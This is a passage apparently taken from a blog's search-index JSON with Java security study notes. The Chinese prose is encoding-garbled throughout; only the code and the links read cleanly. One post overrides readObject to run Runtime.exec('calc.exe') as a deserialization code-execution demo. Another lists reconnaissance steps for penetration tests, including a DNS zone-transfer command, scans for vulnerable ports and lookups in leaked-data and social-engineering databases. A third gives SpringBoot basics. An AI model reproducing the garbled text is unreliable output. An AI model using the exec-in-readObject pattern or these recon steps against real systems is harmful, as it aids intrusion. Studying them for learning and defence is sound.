åˆ›å»ºObjectOutputStreamï¼šåˆ›å»ºä¸€ä¸ªObjectOutputStreamå¯¹è±¡ï¼Œç”¨äºå°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚æµã€‚ å†™å…¥å¯¹è±¡ï¼šä½¿ç”¨writeObject()æ–¹æ³•å°†å¯¹è±¡å†™å…¥åˆ°è¾“å‡ºæµä¸­ã€‚ 123456789101112131415161718192021222324252627282930313233import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.io.Serializable;class Student implements Serializable &#123; private String name; private int age; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public int getAge() &#123; return age; &#125;&#125;public class Serialization &#123; public static void main(String[] args) &#123; Student stu = new Student(&quot;she11F&quot;,18); try(ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;student.bin&quot;)))&#123; oos.writeObject(stu); &#125;catch(IOException e)&#123; e.printStackTrace(); &#125; &#125;&#125; è¿™æ ·æŠŠä¸€ä¸ªå­¦ç”Ÿçš„å®ä¾‹åºåˆ—åŒ–æˆäº†äºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶ä¸”å†™å…¥äº† student.bin æ–‡ä»¶ä¸­ ååºåˆ—åŒ–çš„å®ç° åˆ›å»º ObjectInputStreamï¼šåˆ›å»ºä¸€ä¸ªObjectInputStreamå¯¹è±¡ï¼Œç”¨äºä»å­—èŠ‚æµä¸­è¯»å–å¯¹è±¡ã€‚ è¯»å–å¯¹è±¡ï¼šä½¿ç”¨ readObject() æ–¹æ³•ä»è¾“å…¥æµä¸­è¯»å–å¯¹è±¡ã€‚ 1234567891011121314import java.io.FileInputStream;import java.io.ObjectInputStream;public class DeSerialization &#123; public static void main(String[] args) &#123; try(ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;student.bin&quot;)))&#123; Student stu = (Student) ois.readObject(); System.out.println(stu.getName()); System.out.println(stu.getAge()); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 0x03 æ¼æ´jdk æä¾›é‡å†™ writeObjectï¼ŒreadObject çš„æƒé™ 12private void writeObject(java.io.ObjectOutputStream s)throws java.io.IOExceptionprivate void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundException è€Œä¸”é»˜è®¤æ‰§è¡Œç”¨æˆ·é‡å†™çš„ï¼Œç”¨æˆ·æ²¡æœ‰é‡å†™åˆ™è°ƒç”¨ç³»ç»Ÿçš„ã€‚é‚£æˆ‘ä»¬é‡å†™ readObject å¤¹å¸¦å±é™©å‡½æ•°ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ç«¯ååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¸­æ‹›äº† æˆ‘ä»¬åœ¨ Student ç±»é‡Œé‡æ–°å®šä¹‰ readObject 1234private void readObject(ObjectInputStream ois)throws java.io.IOException, ClassNotFoundException&#123; ois.defaultReadObject(); // æ‰§è¡Œé»˜è®¤çš„ååºåˆ—åŒ– Runtime.getRuntime().exec(&quot;calc.exe&quot;); // å±é™©ä»£ç &#125; ç„¶ååºåˆ—åŒ–è¿™ä¸ªç±»å†ååºåˆ—åŒ–å°±ä¼šå¼¹è®¡ç®—å™¨äº†ï¼Œå½“ç„¶ç°å®å¼€å‘ä¸­ä¸å¤ªå¯èƒ½æš´æ¼è¿™ç§æ¥å£ï¼Œæ‰€ä»¥å¾—å­¦å…¶ä»–æ€æƒ³ï¼Œæˆ‘å…ˆå»å­¦äº†ï¼Œåé¢å†åšè¡¥å……","tags":["java å¼€å‘"],"categories":["å¼€å‘"]},{"title":"ä¿¡æ¯æ”¶é›†æµç¨‹","path":"/2024/07/10/work/ä¿¡æ¯æ”¶é›†æµç¨‹/","content":"æ˜ŸæœŸäº”è¦åšçŸ¥è¯†åˆ†äº«ï¼Œå•¥ä¹Ÿä¸ä¼šå°±åˆ†äº«åˆ†äº«ä¿¡æ¯æ”¶é›†å§ï¼Œé‡ä¸Šæ–°çš„æ–¹æ³•å†åšè¡¥å…… ä¼ä¸šèµ„äº§ä¿¡æ¯æ”¶é›† è‚¡æƒæŠ•èµ„ä¿¡æ¯ ä¸€èˆ¬è¦æ±‚50%æŒè‚¡æˆ–è€…100% æŒè‚¡éƒ½å¯ä»¥ç®—æµ‹è¯•ç›®æ ‡ ä¼æŸ¥æŸ¥ å¤©çœ¼æŸ¥ ç»„ç»‡æ¶æ„ä¿¡æ¯ ç»„ç»‡æ¶æ„ä¿¡æ¯æŒ‡çš„æ˜¯ç›®æ ‡å•ä½çš„ä¸‹çº§å•ä½ï¼Œåˆ†æ”¯æœºæ„ï¼Œå†…éƒ¨ç»„ç»‡æ¶æ„ç­‰ä¿¡æ¯ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä½äºç›®æ ‡å•ä½ç»„ç»‡æ¶æ„ä¸‹çš„å•ä½éƒ½å±äºèµ„äº§èŒƒå›´ï¼Œå¯ä»¥å»å®˜ç½‘æŸ¥çœ‹è¿™ç±»æ¶ˆæ¯ åœ°å€ä¸€ - ç»¿ç›Ÿç§‘æŠ€-å·¨äººèƒŒåçš„ä¸“å®¶ (nsfocus.com.cn) åŸŸåä¿¡æ¯æ”¶é›†0x01 ä¸€çº§åŸŸåæ”¶é›† å¤©çœ¼æŸ¥ï¼Œä¼æŸ¥æŸ¥ï¼Œçˆ±ä¼æŸ¥ åŸŸåå¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢ç³»ç»Ÿ 0x02 å­åŸŸåä¿¡æ¯æ”¶é›†å¯ä»¥å‘ç°ç›®æ ‡å•ä½å¯¹å¤–å¼€æ”¾çš„æ›´å¤šèµ„äº§ https://crt.sh/ å¼•ç”¨è°·æ­Œçš„é¡¹ç›®ä»‹ç»ï¼šâ€œè¦å‘ç”¨æˆ·æä¾›åŠ å¯†æµé‡ï¼Œç½‘ç«™å¿…é¡»å…ˆå‘å¯ä¿¡çš„è¯ä¹¦æˆæƒä¸­å¿ƒ (CA) ç”³è¯·è¯ä¹¦ã€‚ç„¶åï¼Œå½“ç”¨æˆ·å°è¯•è®¿é—®ç›¸åº”ç½‘ç«™æ—¶ï¼Œæ­¤è¯ä¹¦å³ä¼šè¢«æä¾›ç»™æµè§ˆå™¨ä»¥éªŒè¯è¯¥ç½‘ç«™ã€‚è¿‘å¹´æ¥ï¼Œç”±äº HTTPS è¯ä¹¦ç³»ç»Ÿå­˜åœ¨ç»“æ„æ€§ç¼ºé™·ï¼Œè¯ä¹¦ä»¥åŠç­¾å‘è¯ä¹¦çš„ CA å¾ˆå®¹æ˜“é­åˆ°å…¥ä¾µå’Œæ“çºµã€‚Google çš„è¯ä¹¦é€æ˜åº¦é¡¹ç›®æ—¨åœ¨é€šè¿‡æä¾›ä¸€ä¸ªç”¨äºç›‘æµ‹å’Œå®¡æ ¸ HTTPS è¯ä¹¦çš„å¼€æ”¾å¼æ¡†æ¶ï¼Œæ¥ä¿éšœè¯ä¹¦ç­¾å‘æµç¨‹å®‰å…¨æ— è™ã€‚â€ DNS åŸŸä¼ é€ åŸŸä¼ é€æ“ä½œæ˜¯æŒ‡å¤‡ç”¨æœåŠ¡å™¨å‘ä¸»æœåŠ¡å™¨æŸ¥è¯¢æ¥åˆ·æ–°è‡ªå·±çš„Zoneæ•°æ®åº“ï¼Œä¿è¯æ•°æ®ä¸€è‡´æ€§ã€‚æ­¤æ“ä½œçš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ä¸»åŸŸåæœåŠ¡å™¨å› æ„å¤–æ•…éšœå˜å¾—ä¸å¯ç”¨æ—¶å½±å“åˆ°å…¨å±€ã€‚æ­£å¸¸æƒ…å†µä¸‹,åªæœ‰åœ¨ç½‘ç»œé‡Œå­˜åœ¨å¤‡ç”¨åŸŸå DNS æœåŠ¡å™¨æ—¶ï¼ŒDNSåŒºåŸŸä¼ é€æ“ä½œæ‰æœ‰å¿…è¦æ‰§è¡Œã€‚ä¸€æ—¦DNSæœåŠ¡å™¨è¢«é”™è¯¯åœ°é…ç½®æˆä»»ä½•äººå‘å‡ºè¯·æ±‚ï¼Œéƒ½å‘å…¶æä¾›Zoneæ•°æ®åº“çš„æ‹·è´ï¼Œå°±ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ã€‚ å®ç°æ–¹æ³•ï¼š 1.digå‘½ä»¤å¦‚dig @ns2.xxx.com xxx.com axfrns2.xxx.comä¸ºæä¾›æ•°æ®çš„æœåŠ¡å™¨ï¼Œxxx.comä¸ºè¦ä¼ è¾“çš„å…³é”®å­—ï¼Œaxfrä¸ºåŒºåŸŸä¼ è¾“é€‰é¡¹ã€‚ 2.pythonä¸­dnsåº“xfr &#x3D; dns.query.xfr(where&#x3D;server, zone&#x3D;self.domain, timeout&#x3D;5.0, lifetime&#x3D;10.0)zone &#x3D; dns.zone.from_xfr(xfr) ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒDNSæœåŠ¡å™¨éƒ½é…ç½®æ­£ç¡®ï¼Œå…³é—­äº†dnsä¼ è¾“æˆ–è®¾ç½®äº†ç™½åå•ï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸçš„æ¦‚ç‡è¾ƒä½ã€‚ æœç´¢å¼•æ“&#x2F;ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ google è¯­æ³• site:nsfocus.com -www fofa domain=&quot;nsfocus.com&quot; å­åŸŸåçˆ†ç ´ å­—å…¸æ‹¼æ¥ï¼Œlayer è‡ªåŠ¨åŒ–æ”¶é›†å·¥å…· ç°åœ¨å¾ˆå¤šè‡ªåŠ¨åŒ–å·¥å…·å·²ç»é›†æˆäº†å¾ˆå¤šç§æ”¶é›†æ–¹å¼ï¼Œæ¯”å¦‚ subfinderï¼Œoneforall å…¬ç½‘IPæ”¶é›† pingå‘½ä»¤ ï¼špingå‘½ä»¤ä¼šå›æ˜¾å‡ºå¯¹æ–¹åŸŸåå¯¹åº”çš„IPï¼Œä½†åªæœ‰ä¸€ä¸ªï¼Œä¸€èˆ¬æ˜¯éæƒå¨åº”ç­”ã€‚ nslooupï¼šä¼šè¿”å›è‡ªå·±çš„æœåŠ¡å™¨ä»¥åŠå¯¹æ–¹æ‰€æœ‰çš„æœåŠ¡å™¨ dig +åŸŸå ï¼šå›æ˜¾å‡ºåŸŸåå¯¹åº”çš„æœåŠ¡å™¨ ç«™é•¿å·¥å…·IP whoisï¼šhttps://tool.chinaz.com/ipwhois æ ¹æ® IP å¯»æ‰¾ Web æœåŠ¡0x01 æ”¶é›† IP å¼€æ”¾çš„è„†å¼±ç«¯å£12345671099 javarmi1433 mssql1521 oracle3306 mysql6379 redis7000 - 10000 å¸¸è§webæœåŠ¡ç«¯å£ 40000-60000 å‘æ—¥è‘µ RCE æ¨èå·¥å…· TxPortMax 0x02 æ”¶é›†å…¬ç½‘ IP çš„ Web æŒ‡çº¹ è¯†åˆ«ç½‘é¡µ &#x2F;HTML&#x2F;CSS&#x2F;JS æˆ–è€… robots.txt çš„å…³é”®å­—ï¼Œå›¾æ ‡ï¼Œæ–‡ä»¶åç¼€ï¼Œç‰¹å¾ç›®å½• æŠ“åŒ…çœ‹ http è¿”å›æ¶ˆæ¯ï¼Œæå– server å­—æ®µ é€šè¿‡åº”ç”¨æ‰€åœ¨ç«¯å£è¿›è¡Œåˆ¤æ–­ï¼Œæ¯”å¦‚ 7001 æ˜¯ weblogic é€šè¿‡æŠ¥é”™é¡µé¢åˆ¤æ–­ é€šè¿‡äºŒå¼€çš„æ¡†æ¶åˆ¤æ–­ï¼Œæ¯”å¦‚ tpï¼Œè‹¥ä¾ é€šè¿‡æ’ä»¶æ¯”å¦‚ Wappalyzer 0x03 Web ç³»ç»Ÿç›®å½•æ‰«æ åå°ç®¡ç†åœ°å€ å®‰è£…åŒ…ï¼Œç½‘ç«™å¤‡ä»½æ–‡ä»¶ ä¸Šä¼ ç›®å½•ï¼Œä¸‹è½½ç›®å½• mysql ç®¡ç†æ¥å£ï¼Œphpinfo ç•Œé¢ cmsï¼Œæ¡†æ¶çš„å®‰è£…æˆ–è€…é»˜è®¤ç•Œé¢ ç½‘ç«™é…ç½®æ–‡ä»¶ï¼Œå¦‚ WEB-INF&#x2F;web.xml æœªæˆæƒ api æ¥å£ 0x04 Web ç³»ç»Ÿ JS æ–‡ä»¶åˆ†æ jsfinder æµè§ˆå™¨æ’ä»¶ 0x05 Web ç³»ç»ŸæŠ¥é”™ä¿¡æ¯ æ”¹ http æ–¹æ³• å¢åˆ æ”¹å‚æ•° æ‰¾ç³»ç»Ÿç‰¹æ€§ ç‰¹æ®Šç¬¦å· Sql é”™è¯¯ æ”¶é›†ç›®æ ‡ä¼ä¸šç§»åŠ¨ç«¯èµ„äº§ å¤©çœ¼æŸ¥ï¼Œå°è“æœ¬ ç¬¬ä¸‰æ–¹åº”ç”¨å¸‚åœºï¼Œå‚å•†å…³é”®å­— Appstore æŸ¥çœ‹å¼€å‘è€…ä¿¡æ¯ å¾®ä¿¡æœç´¢å°ç¨‹åºï¼Œå…¬ä¼—å· æœç‹—æœç´¢å°ç¨‹åº æ”¶é›†ç›®æ ‡å…¬ç½‘æ³„éœ²ä¿¡æ¯ github è¯­é›€ ä¸ªäººæ•æ„Ÿä¿¡æ¯æ”¶é›† ç¤¾å·¥åº“ ä¿¡æ¯æ”¶é›†è‡ªåŠ¨åŒ– ç¯å¡” ez","tags":["æ¸—é€æµ‹è¯•","å®æˆ˜"],"categories":["æ‰“å·¥äººçš„ä¸‰ä¸¤äº‹"]},{"title":"SpringBoot å­¦ä¹ ","path":"/2024/07/10/java/å¼€å‘/SpringBoot/","content":"å¼€å¯ java å®‰å…¨å­¦ä¹ ç¬¬ä¸€ç«™ï¼ŒSpringBoot åˆ›å»ºç¬¬ä¸€ä¸ª SpringBoot é¡¹ç›®å¯ä»¥å®˜ç½‘å¯¼å…¥åˆ›å»ºï¼Œè¿™é‡Œå°±ç›´æ¥ IJ å¯¼å…¥äº†ï¼Œæ–¹ä¾¿ä¸€äº›ã€‚ 0x01 æ‰“å¼€ IDEAï¼Œæ–°å»ºé¡¹ç›®æ³¨æ„åˆ°Spring Boot å®˜æ–¹ä¸å†æ”¯æŒ Spring Boot çš„ 2.x ç‰ˆæœ¬äº†ï¼Œä¹‹åå…¨åŠ›ç»´æŠ¤ 3.xï¼›è€Œ Spring Boot 3.x å¯¹ JDK ç‰ˆæœ¬çš„æœ€ä½è¦æ±‚æ˜¯ 17ï¼æ‰€ä»¥æˆ‘ä»¬é€‰ä¸äº† java8 è¯­è¨€ç‰ˆæœ¬ï¼Œæˆ‘å¯ä»¥æ›¿æ¢ Server URL ä¸ºé˜¿é‡Œçš„é•œåƒç«™ï¼Œè¿™æ ·å°±å¯ä»¥é€‰äº† https://start.aliyun.com/ 0x02 é€‰æ‹© SpringBoot ç‰ˆæœ¬ï¼Œé…ç½®ä¾èµ–è¿™é‡Œ jdk8 çš„è¯â€”å®šè¦é€‰ SpringBoot å°äº3.0.0çš„ç‰ˆæœ¬ï¼Œä¾èµ–å…ˆæ·»åŠ ä¸€ä¸ª Spring Webï¼Œä¹Ÿå¯ä»¥ä¸æ·»åŠ  åˆ›å»ºå®ŒæˆåæŠŠ demo ç›®å½•åˆ æ‰ 0x03 é…ç½®å¯åŠ¨ç«¯å£ï¼Œå¹¶ä¸”æµ‹è¯•åœ¨ resources æ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ° application.properties æ–‡ä»¶ï¼Œè®¾ç½®å¯åŠ¨ç«¯å£ä¸º 8088 1server.port=8088 ç¼–å†™ä¸€ä¸ªæ§åˆ¶ç±» åœ¨å¯åŠ¨é¡µé¢åŒä¸€çº§ç›®å½•ä¸‹ï¼Œåˆ›å»º controller æ–‡ä»¶å¤¹ ç¼–å†™ 12345678910111213package com.she11f.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController@RequestMapping(&quot;/hello&quot;)public class HelloWorld &#123; @RequestMapping(&quot;/hello&quot;) public String helloWorld() &#123; return &quot;Hello World!&quot;; &#125;&#125; å…¶ä¸­ï¼š@RestController &#x3D; @Controller + @ResponseBody è€Œ@ResponseBody ï¼š è¯¥æ³¨è§£ç”¨äºå°†Controller çš„æ–¹æ³•è¿”å›å¯¹è±¡ï¼Œé€šè¿‡é€‚å½“çš„HttpMessageConverterè½¬æ¢ä¸ºæŒ‡å®šæ ¼å¼åï¼Œå†™å…¥Responseå¯¹è±¡çš„bodyæ•°æ®åŒºã€‚ @Controller ä¸ç”¨è§£é‡Šäº† å¦å¤–ï¼š@RequestMapping ï¼šç”¨æ¥å¤„ç†è¯·æ±‚åœ°å€æ˜ å°„çš„æ³¨è§£ï¼Œå¯ç”¨äºç±»æˆ–æ–¹æ³•ä¸Šã€‚ ä¹Ÿå¯ä»¥å†™ä½œ GetMapping ã€PostMappingã€PutMapping ã€DeleteMapping ã€PatchMappingã€‚è¿™äº›åœ¨åé¢çš„æ–‡ç« æˆ‘ä»¬åœ¨è¯¦ç»†è¯´æ˜ã€‚ ç„¶åç›´æ¥å¯åŠ¨ï¼Œè®¿é—® 127.0.0.1:8088&#x2F;hello&#x2F;hello ä¹Ÿå¯ä»¥æŠŠç¨‹åºæ‰“åŒ…æˆ jar åŒ…ï¼Œç„¶åå‘½ä»¤è¡Œå¯åŠ¨ã€‚ç‚¹å‡» Maven ç”Ÿå‘½å‘¨æœŸé‡Œçš„ package ï¼Œinstall ç„¶ååœ¨ target ç›®å½•ä¸‹å‘ç°ä¸€ä¸ª jar åŒ…å°±è¯æ˜æ‰“åŒ…æˆåŠŸäº†ã€‚ è¿˜èƒ½ DIY ä¸€ä¸‹ï¼Œæ›´æ”¹å¯åŠ¨æ—¶bannerå›¾æ¡ˆã€‚åˆ°é¡¹ç›®ä¸‹çš„ resources ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªbanner.txt å³å¯: å›¾æ¡ˆå¯ä»¥åˆ°ç½‘ç«™ https://www.bootschool.net/ascii ç”Ÿæˆï¼Œæ‹·è´åˆ°æ–‡ä»¶ä¸­å³å¯ï¼ SpringBoot è¿è¡ŒåŸç†è´´ä¸ªé“¾æ¥å§ï¼Œæ„Ÿè§‰è¿™ä¸ªå¯¹å¼€å‘æ¥è¯´éƒ½å¾ˆéš¾ç†è§£ï¼Œå…ˆå­¦ä¼šå¦‚ä½•ç”¨å§ã€‚ Spring Bootï¼šæœ€å…¨SpringBootå¯åŠ¨æµç¨‹åŸç†åˆ†æ(å…¨ç½‘æœ€å…¨æœ€å®Œå–„)-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com) Yaml è¯­æ³•SpringBootä½¿ç”¨ä¸€ä¸ªå…¨å±€çš„é…ç½®æ–‡ä»¶ ï¼Œ é…ç½®æ–‡ä»¶åç§°æ˜¯å›ºå®šçš„ application.properties è¯­æ³•ç»“æ„ ï¼škey&#x3D;value application.yml è¯­æ³•ç»“æ„ ï¼škeyï¼šç©ºæ ¼ value é…ç½®æ–‡ä»¶çš„ä½œç”¨ ï¼šä¿®æ”¹SpringBootè‡ªåŠ¨é…ç½®çš„é»˜è®¤å€¼ï¼Œå› ä¸ºSpringBootåœ¨åº•å±‚éƒ½ç»™æˆ‘ä»¬è‡ªåŠ¨é…ç½®å¥½äº†ï¼› å°±æ¯”å¦‚æˆ‘ä»¬åœ¨é¡¹ç›®åˆ›å»ºçš„æ—¶å€™ä¿®æ”¹è¿‡ tomcat å¯åŠ¨ç«¯å£ä¸º 8088ï¼Œå°±æ˜¯åœ¨ **application.properties **æ–‡ä»¶ä¸­ä¿®æ”¹ã€‚ 0x01 yamlæ¦‚è¿°ä¼ ç»Ÿxmlé…ç½®ï¼š 1&lt;server&gt;&lt;port&gt;8081&lt;port&gt;&lt;/server&gt; yamlé…ç½®ï¼š 12serverï¼š prot: 8080 è¯´æ˜ï¼šè¯­æ³•è¦æ±‚ä¸¥æ ¼ï¼ ç©ºæ ¼ä¸èƒ½çœç•¥ ä»¥ç¼©è¿›æ¥æ§åˆ¶å±‚çº§å…³ç³»ï¼Œåªè¦æ˜¯å·¦è¾¹å¯¹é½çš„ä¸€åˆ—æ•°æ®éƒ½æ˜¯åŒä¸€ä¸ªå±‚çº§çš„ã€‚ å±æ€§å’Œå€¼çš„å¤§å°å†™éƒ½æ˜¯ååˆ†æ•æ„Ÿçš„ã€‚ 0x02 åŸºæœ¬å†™æ³•å¯¹è±¡ã€Mapï¼ˆé”®å€¼å¯¹ï¼‰ 1#å¯¹è±¡ã€Mapæ ¼å¼k: v1: v2: åœ¨ä¸‹ä¸€è¡Œæ¥å†™å¯¹è±¡çš„å±æ€§å’Œå€¼å¾—å…³ç³»ï¼Œæ³¨æ„ç¼©è¿›ï¼›æ¯”å¦‚ï¼š 123student: name: she11F age: 3 å¯¹äº†ï¼Œæˆ‘ç”¨çš„è¿™ä¸ªåšå®¢ hexo é…ç½®æ–‡ä»¶å°±æ˜¯ç”¨çš„ yaml è¡Œå†…å†™æ³• 1student: &#123;name: qinjiang,age: 3&#125; æ•°ç»„ï¼ˆ Listã€set ï¼‰ ç”¨ - å€¼è¡¨ç¤ºæ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ,æ¯”å¦‚ï¼š 1234pets: - cat - dog - pig è¡Œå†…å†™æ³• 1pets: [cat,dog,pig] yaml ä¿®æ”¹ç«¯å£å·çš„è¯å°±æ˜¯è¿™æ ·å†™ 12server: port: 8082 æˆ‘ä»¬åˆ é™¤ application.properties ï¼Œæ–°å»º application.yaml Webå¼€å‘0x01 é™æ€èµ„æºå¤„ç† webjars å¯¼å…¥ Webjarsæœ¬è´¨å°±æ˜¯ä»¥jaråŒ…çš„æ–¹å¼å¼•å…¥æˆ‘ä»¬çš„é™æ€èµ„æº ï¼Œ æˆ‘ä»¬ä»¥å‰è¦å¯¼å…¥ä¸€ä¸ªé™æ€èµ„æºæ–‡ä»¶ï¼Œç›´æ¥å¯¼å…¥å³å¯ã€‚ ç½‘ç«™ï¼šhttps://www.webjars.org æ¯”å¦‚è¯´è¦ä½¿ç”¨jQueryï¼Œé€‰æ‹© maven åæ ‡ï¼Œæˆ‘ä»¬åªè¦è¦å¼•å…¥jQueryå¯¹åº”ç‰ˆæœ¬çš„pomä¾èµ–å³å¯ï¼ 12345&lt;dependency&gt; &lt;groupId&gt;org.webjars.npm&lt;/groupId&gt; &lt;artifactId&gt;github-com-jquery-jquery&lt;/artifactId&gt; &lt;version&gt;3.6.0&lt;/version&gt;&lt;/dependency&gt; è®¿é—®ï¼šåªè¦æ˜¯é™æ€èµ„æºï¼ŒSpringBootå°±ä¼šå»å¯¹åº”çš„è·¯å¾„å¯»æ‰¾èµ„æºï¼Œæˆ‘ä»¬è¿™é‡Œè®¿é—®ï¼š127.0.0.1:8088&#x2F;webjars&#x2F;jquery&#x2F;3.4.1&#x2F;jquery.js å°±èƒ½çœ‹åˆ° jquery æºç  é™æ€èµ„æºæ˜ å°„è§„åˆ™ â€‹\tå¯ä»¥åœ¨ resources æ–‡ä»¶å¤¹ä¸‹å»ºç«‹ publicï¼Œstaticï¼Œresourcesï¼Œtemplates æ–‡ä»¶å¤¹æ¥å­˜æ”¾é™æ€æ–‡ä»¶ï¼Œæ¯”å¦‚åœ¨ public ä¸‹åˆ›åŠ 1.js â€‹\tè®¿é—®è·¯å¾„ 127.0.0.1:8088&#x2F;1.jsï¼Œå®ƒå°±ä¼šè‡ªåŠ¨å»å¯»æ‰¾ 0x02 thymeleaf æ¨¡æ¿å¼•æ“ æ¨¡æ¿å¼•æ“çš„ä½œç”¨å°±æ˜¯æˆ‘ä»¬æ¥å†™ä¸€ä¸ªé¡µé¢æ¨¡æ¿ï¼Œæ¯”å¦‚æœ‰äº›å€¼å‘¢ï¼Œæ˜¯åŠ¨æ€çš„ï¼Œæˆ‘ä»¬å†™ä¸€äº›è¡¨è¾¾å¼ã€‚è€Œè¿™äº›å€¼ï¼Œä»å“ªæ¥å‘¢ï¼Œå°±æ˜¯æˆ‘ä»¬åœ¨åå°å°è£…ä¸€äº›æ•°æ®ã€‚ç„¶åæŠŠè¿™ä¸ªæ¨¡æ¿å’Œè¿™ä¸ªæ•°æ®äº¤ç»™æˆ‘ä»¬æ¨¡æ¿å¼•æ“ï¼Œæ¨¡æ¿å¼•æ“æŒ‰ç…§æˆ‘ä»¬è¿™ä¸ªæ•°æ®å¸®ä½ æŠŠè¿™è¡¨è¾¾å¼è§£æã€å¡«å……åˆ°æˆ‘ä»¬æŒ‡å®šçš„ä½ç½®ï¼Œç„¶åæŠŠè¿™ä¸ªæ•°æ®æœ€ç»ˆç”Ÿæˆä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„å†…å®¹ç»™æˆ‘ä»¬å†™å‡ºå»ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¿™ä¸ªæ¨¡æ¿å¼•æ“ï¼Œä¸ç®¡æ˜¯jspè¿˜æ˜¯å…¶ä»–æ¨¡æ¿å¼•æ“ï¼Œéƒ½æ˜¯è¿™ä¸ªæ€æƒ³ã€‚åªä¸è¿‡å‘¢ï¼Œå°±æ˜¯è¯´ä¸åŒæ¨¡æ¿å¼•æ“ä¹‹é—´ï¼Œä»–ä»¬å¯èƒ½è¿™ä¸ªè¯­æ³•æœ‰ç‚¹ä¸ä¸€æ ·ã€‚å…¶ä»–çš„æˆ‘å°±ä¸ä»‹ç»äº†ï¼Œæˆ‘ä¸»è¦æ¥ä»‹ç»ä¸€ä¸‹SpringBoot ç»™æˆ‘ä»¬æ¨èçš„ Thymeleaf æ¨¡æ¿å¼•æ“ï¼Œè¿™æ¨¡æ¿å¼•æ“å‘¢ï¼Œæ˜¯ä¸€ä¸ªé«˜çº§è¯­è¨€çš„æ¨¡æ¿å¼•æ“ï¼Œä»–çš„è¿™ä¸ªè¯­æ³•æ›´ç®€å•ã€‚è€Œä¸”å‘¢ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ã€‚ jspæ”¯æŒéå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬èƒ½å†™Javaä»£ç ï¼Œä½†æ˜¯å‘¢ï¼Œæˆ‘ä»¬ç°åœ¨çš„è¿™ç§æƒ…å†µï¼ŒSpringBootè¿™ä¸ªé¡¹ç›®é¦–å…ˆæ˜¯ä»¥jarçš„æ–¹å¼ï¼Œä¸æ˜¯warï¼Œåƒç¬¬äºŒï¼Œæˆ‘ä»¬ç”¨çš„è¿˜æ˜¯åµŒå…¥å¼çš„Tomcatï¼Œæ‰€ä»¥å‘¢ï¼Œä»–ç°åœ¨é»˜è®¤æ˜¯ä¸æ”¯æŒjspçš„ Thymeleaf å®˜ç½‘ï¼šhttps://www.thymeleaf.org/ Thymeleaf åœ¨Github çš„ä¸»é¡µï¼šhttps://github.com/thymeleaf/thymeleaf Springå®˜æ–¹æ–‡æ¡£ï¼šæ‰¾åˆ°æˆ‘ä»¬å¯¹åº”çš„ç‰ˆæœ¬ https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/reference/htmlsingle/#using-boot-starter æ‰¾åˆ°å¯¹åº”çš„pomä¾èµ–ï¼šå¯ä»¥é€‚å½“ç‚¹è¿›æºç çœ‹ä¸‹æœ¬æ¥çš„åŒ…ï¼ 12345&lt;!--thymeleaf--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt; Mavenä¼šè‡ªåŠ¨ä¸‹è½½jaråŒ…ï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹ä¸‹ä¸‹è½½çš„ä¸œè¥¿ï¼› ä½¿ç”¨ï¼š æˆ‘ä»¬åªéœ€è¦æŠŠæˆ‘ä»¬çš„htmlé¡µé¢æ”¾åœ¨ç±»è·¯å¾„ä¸‹çš„ templates ä¸‹ï¼Œthymeleafå°±å¯ä»¥å¸®æˆ‘ä»¬è‡ªåŠ¨æ¸²æŸ“äº†ã€‚åœ¨ templates æ–‡ä»¶å¤¹ä¸‹æ–°å»º index.html æ–‡ä»¶ è¦ä½¿ç”¨thymeleafï¼Œéœ€è¦åœ¨htmlæ–‡ä»¶ä¸­å¯¼å…¥å‘½åç©ºé—´çš„çº¦æŸï¼Œæ–¹ä¾¿æç¤ºã€‚å¯ä»¥å»å®˜æ–¹æ–‡æ¡£çš„#3ä¸­çœ‹ä¸€ä¸‹å‘½åç©ºé—´æ‹¿æ¥è¿‡æ¥ 1xmlns:th=&quot;http://www.thymeleaf.org&quot; ç¼–å†™ html é¡µé¢ 12345678910111213&lt;!DOCTYPE html&gt;&lt;!--ä½¿ç”¨http://www.thymeleaf.org/thymeleaf-extras-spring,çº¢è‰²ä¸‹åˆ’çº¿æ¶ˆå¤±--&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;æµ‹è¯•é¡µé¢&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Test&lt;/h1&gt;&lt;!--th:textå°±æ˜¯å°†divä¸­çš„å†…å®¹è®¾ç½®ä¸ºå®ƒæŒ‡å®šçš„å€¼ï¼Œå’Œä¹‹å‰å­¦ä¹ çš„Vueä¸€æ ·--&gt;&lt;div th:text=&quot;$&#123;msg&#125;&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; templates 